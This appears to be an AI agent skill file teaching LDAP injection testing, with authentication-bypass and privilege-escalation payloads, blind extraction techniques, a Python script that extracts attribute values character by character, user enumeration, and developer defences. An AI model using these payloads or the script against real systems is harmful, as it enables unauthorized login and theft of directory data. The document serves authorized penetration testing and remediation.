---
name: LDAP Injection Testing
description: This skill should be used when the user asks to "test for LDAP injection vulnerabilities", "exploit LDAP queries", "perform blind LDAP injection attacks", "bypass authentication using LDAP injection", "extract data from LDAP directories", or "assess LDAP-based application security". It provides comprehensive techniques for identifying and exploiting LDAP injection flaws in web applications.
version: 1.0.0
tags: [ldap, injection, authentication-bypass, blind-injection, directory-services, web-security]
---

# LDAP Injection Testing

## Purpose

Identify and exploit LDAP injection vulnerabilities in web applications that interact with LDAP directory services. LDAP injection attacks manipulate queries sent to LDAP servers, enabling authentication bypass, privilege escalation, and sensitive data extraction from corporate directories including Active Directory, OpenLDAP, and Novell eDirectory.

## Prerequisites

### Required Knowledge
- Understanding of LDAP protocol and directory structure
- Familiarity with LDAP filter syntax (RFC 4515)
- Web application testing fundamentals
- Knowledge of authentication mechanisms

### Required Tools
- Web browser with developer tools
- Burp Suite or similar proxy
- Custom scripts for blind injection automation
- Access to test LDAP environment

### Required Access
- Target web application URL
- Test user credentials (if available)
- Written authorization for testing

## Outputs and Deliverables

1. **Vulnerability Assessment Report** - Document all injection points and severity
2. **Proof of Concept Exploits** - Working injection payloads for each vulnerability
3. **Data Extraction Results** - Enumerated attributes, users, and directory structure
4. **Remediation Recommendations** - Input validation and parameterized query guidance

## Core Workflow

### Phase 1: LDAP Filter Syntax Understanding

Master LDAP filter construction before testing:

```
# LDAP Filter Structure
Filter = ( filtercomp )
Filtercomp = and / or / not / item
And = & filterlist
Or = | filterlist
Not = ! filter

# Operators
=    Equal
~=   Approximate
>=   Greater than or equal
<=   Less than or equal
*    Wildcard (one or more characters)

# Special Constants
(&)  Absolute TRUE
(|)  Absolute FALSE
```

### Phase 2: Injection Point Detection

Test input fields for LDAP injection susceptibility:

```bash
# Basic injection test characters
*
*)
*))
)(
)(&
))(|
```

Observe application responses for:
- Error messages revealing LDAP syntax
- Unexpected data disclosure
- Authentication bypass indicators
- Application behavior changes

### Phase 3: AND Injection Exploitation

Target applications using AND operator in queries:

**Authentication Bypass:**
```
# Original query structure
(&(USER=input)(PASSWORD=input))

# Injection payload (username field)
username: slisberger)(&))
password: anything

# Resulting query (first filter processed)
(&(USER=slisberger)(&))(PASSWORD=anything))
# Evaluates to TRUE - bypasses password check
```

**Privilege Escalation:**
```
# Original query for low-privilege documents
(&(directory=documents)(security_level=low))

# Injection payload
documents)(security_level=*))(&(directory=documents

# Resulting query
(&(directory=documents)(security_level=*))(&(directory=documents)(security_level=low))
# First filter returns ALL security levels
```

### Phase 4: OR Injection Exploitation

Target applications using OR operator in queries:

**Information Disclosure:**
```
# Original resource query
(|(type=printer)(type=scanner))

# Injection payload
printer)(uid=*)

# Resulting query
(|(type=printer)(uid=*))(type=scanner))
# Returns all printers AND all user objects
```

**Object Enumeration:**
```
# Inject to enumerate different object classes
printer)(objectClass=person)
printer)(objectClass=computer)
printer)(objectClass=group)
```

### Phase 5: Blind LDAP Injection

Extract data through TRUE/FALSE responses when errors are suppressed:

**AND Blind Injection:**
```
# Test if objectClass exists
*)(objectClass=users))(&(objectClass=void

# If icons/results appear = TRUE (class exists)
# If no results = FALSE (class doesn't exist)

# Enumerate object classes
*)(objectClass=person))(&(objectClass=void
*)(objectClass=computer))(&(objectClass=void
*)(objectClass=group))(&(objectClass=void
```

**OR Blind Injection:**
```
# Inverse logic for OR queries
void)(objectClass=users))(&(objectClass=void

# Results appear = TRUE
# No results = FALSE
```

### Phase 6: Attribute Discovery

Enumerate available attributes through blind injection:

```
# Test for common attributes
*)(uid=*))(&(1=0
*)(cn=*))(&(1=0
*)(mail=*))(&(1=0
*)(telephoneNumber=*))(&(1=0
*)(department=*))(&(1=0
*)(userPassword=*))(&(1=0

# TRUE response indicates attribute exists
```

### Phase 7: Booleanization Attack

Extract attribute values character by character:

```
# Determine if department starts with 'a'
*)(department=a*))(&(1=0
# FALSE - doesn't start with 'a'

# Try 'f'
*)(department=f*))(&(1=0
# TRUE - starts with 'f'

# Continue with second character
*)(department=fa*))(&(1=0
# FALSE

*)(department=fi*))(&(1=0
# TRUE - starts with 'fi'

# Continue until full value extracted: "finance"
```

### Phase 8: Charset Reduction

Optimize extraction using binary search:

```
# Test if character is in range a-m
*)(department>=a)(department<=m*))(&(1=0

# If TRUE, narrow to a-g
# If FALSE, check n-z

# Continue binary search to identify exact character
# Reduces average attempts from 26 to ~5 per character
```

## Quick Reference

### Common Injection Payloads

| Context | Payload | Purpose |
|---------|---------|---------|
| Auth Bypass | `admin)(&))` | Bypass password verification |
| Auth Bypass | `*)(uid=*))(|(uid=*` | Return all users |
| Wildcard | `*` | Match any value |
| Info Disclosure | `value)(injected=*)` | Add additional filter |
| Privilege Escalation | `*)(security=*))(&(1=0` | Access restricted data |
| Blind TRUE | `*)(objectClass=*))(&(objectClass=void` | Force TRUE response |
| Blind FALSE | `void)(objectClass=void` | Force FALSE response |

### LDAP Special Characters

| Character | Escape Sequence | Usage |
|-----------|-----------------|-------|
| `*` | `\2a` | Wildcard |
| `(` | `\28` | Filter start |
| `)` | `\29` | Filter end |
| `\` | `\5c` | Escape character |
| `NUL` | `\00` | Null byte |

### Common LDAP Attributes

```
uid          - User ID
cn           - Common Name
sn           - Surname
mail         - Email address
userPassword - Password hash
memberOf     - Group membership
department   - Department name
telephoneNumber - Phone
objectClass  - Object type
distinguishedName - Full DN path
```

### Detection Indicators

```
# Error messages suggesting LDAP
"LDAP error"
"Invalid DN syntax"
"Filter error"
"javax.naming.directory"
"ldap_search"
"Bad search filter"
```

## Constraints and Limitations

### Technical Limitations
- OpenLDAP ignores malformed trailing content
- ADAM (Active Directory) rejects queries with multiple filters
- Some frameworks validate filter syntax before execution
- Blind injection requires many requests for data extraction

### Ethical Boundaries
- Only test with explicit written authorization
- Avoid modifying production directory data
- Do not access personal employee information beyond scope
- Report vulnerabilities through proper channels

### Environmental Factors
- Web application framework may sanitize inputs
- WAF rules may block injection attempts
- Rate limiting can slow blind injection attacks
- Different LDAP implementations behave differently

## Examples

### Example 1: Login Bypass

**Scenario:** Test login form for LDAP injection

```
# Step 1: Identify normal login behavior
Username: testuser
Password: testpass
Result: "Invalid credentials"

# Step 2: Test for injection
Username: testuser)(|(password=*
Password: anything
Result: "Login successful" - VULNERABLE

# Step 3: Bypass specific user
Username: admin)(&))
Password: bypass
Result: Logged in as admin
```

### Example 2: Blind Data Extraction

**Scenario:** Extract department value through blind injection

```python
#!/usr/bin/env python3
import requests

url = "https://target.com/search"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
extracted = ""

while True:
    found = False
    for char in charset:
        payload = f"*)(department={extracted}{char}*))(&(1=0"
        response = requests.get(url, params={"query": payload})
        
        if "results found" in response.text:  # TRUE indicator
            extracted += char
            found = True
            print(f"Found: {extracted}")
            break
    
    if not found:
        break

print(f"Extracted value: {extracted}")
```

### Example 3: User Enumeration

**Scenario:** Enumerate valid usernames via blind injection

```
# Test if 'admin' user exists
*)(uid=admin))(&(1=0
# TRUE - user exists

# Test if 'root' user exists
*)(uid=root))(&(1=0
# FALSE - user doesn't exist

# Enumerate with common usernames
administrator, guest, service, backup, operator
```

## Troubleshooting

### Injection Not Working

**Problem:** Payloads don't affect application behavior

**Solutions:**
1. Verify application uses LDAP backend (check for LDAP error messages)
2. Test different injection contexts (AND vs OR)
3. Try URL-encoded versions of special characters
4. Check if input is being sanitized or escaped
5. Test with simpler payloads first (`*`, `)`)

### Blind Injection Inconsistent

**Problem:** TRUE/FALSE responses are unreliable

**Solutions:**
1. Establish reliable baseline for TRUE and FALSE responses
2. Account for timing variations (use response content, not time)
3. Increase delay between requests to avoid rate limiting
4. Verify the injection point is actually processed by LDAP

### Authentication Bypass Fails

**Problem:** Cannot bypass login with injection

**Solutions:**
1. Try different filter termination sequences
2. Test both username and password fields
3. Attempt null byte injection: `admin%00`
4. Check if multi-step authentication exists
5. Verify the login uses LDAP (could be database-backed)

### Data Extraction Incomplete

**Problem:** Booleanization returns partial data

**Solutions:**
1. Expand character set (include uppercase, symbols)
2. Check for multi-valued attributes
3. Account for spaces and special characters in values
4. Use wildcard at end to detect remaining characters
5. Verify charset matches LDAP attribute encoding

## Prevention Recommendations

### For Developers

1. **Use Parameterized Queries**
   ```java
   // Use LDAP SDK with proper escaping
   String filter = Filter.createEqualityFilter("uid", userInput);
   ```

2. **Input Validation**
   ```python
   # Whitelist allowed characters
   import re
   if not re.match(r'^[a-zA-Z0-9_-]+$', username):
       raise ValueError("Invalid username format")
   ```

3. **Escape Special Characters**
   ```python
   def ldap_escape(value):
       escape_chars = {'\\': '\\5c', '*': '\\2a', '(': '\\28', 
                       ')': '\\29', '\x00': '\\00'}
       for char, escape in escape_chars.items():
           value = value.replace(char, escape)
       return value
   ```

4. **Implement Least Privilege**
   - LDAP service accounts should have minimal permissions
   - Restrict access to sensitive attributes
   - Use read-only connections where possible
